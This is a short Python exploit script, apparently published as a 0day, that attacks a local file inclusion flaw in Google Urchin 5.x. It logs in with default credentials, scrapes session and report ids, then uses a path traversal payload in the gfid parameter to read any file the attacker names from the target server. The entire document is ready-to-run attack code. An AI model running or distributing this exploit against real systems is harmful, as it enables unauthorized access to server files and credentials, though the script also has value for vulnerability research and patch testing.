#!/usr/bin/env python

# Author: "Kristian Erik Hermansen" <kristian.hermansen@gmail.com>
# Date: December 2010
# Google Urchin 5.x LFI in gfid parameter (0day)

from sys import argv
import httplib, urllib

if len(argv) < 3:
    print 'usage: %s <host> <file> [port] [user] [pass]' % (argv[0])
    exit(1)

HOST = argv[1]
FILE = argv[2]
PORT = int(argv[3]) or 9999
USER = argv[4] or 'admin'
PASS = argv[5] or 'urchin'

conn = httplib.HTTPConnection('%s:%d' % (HOST,PORT))

conn.request('GET', '/')
response = conn.getresponse()
if str(response.status)[0] == '3':
    print '[-] Host probably uses SSL. Not supported.'
    exit(2)
data = response.read()
app = data.split('<input type="hidden" name="app" value="')[1].split('"')[0]

params = urllib.urlencode({'user': USER, 'pass': PASS, 'app': app,
'action': 'login'})

conn.request('POST', '/session.cgi', params)
response = conn.getresponse()
data = response.read()
if data.find('Authentication Failed.') == -1:
    print '[*] Authentication succeeded :)'
else:
    print '[-] Authentication failed :('
    exit(3)
sid = data.split('?sid=')[1].split('&')[0]
rid = data.split('<a href="javascript:openReport(')[1].split(',')[0]

if app == 'admin.exe':
    pad = '..\\'*16
else:
    pad = '../'*16
conn.request('GET',
'/session.cgi?sid=%s&action=prop&app=urchin.cgi&rid=%s&cmd=svg&gfid=%s%s&ie5=.svg'
% (sid,rid,pad,FILE))
response = conn.getresponse()
data = response.read()

if data.find('SVG image not found. Possible causes are:') == -1:
    print data
else:
    print '[-] Failed to retrive requested file. May not exist on host.'

conn.close()
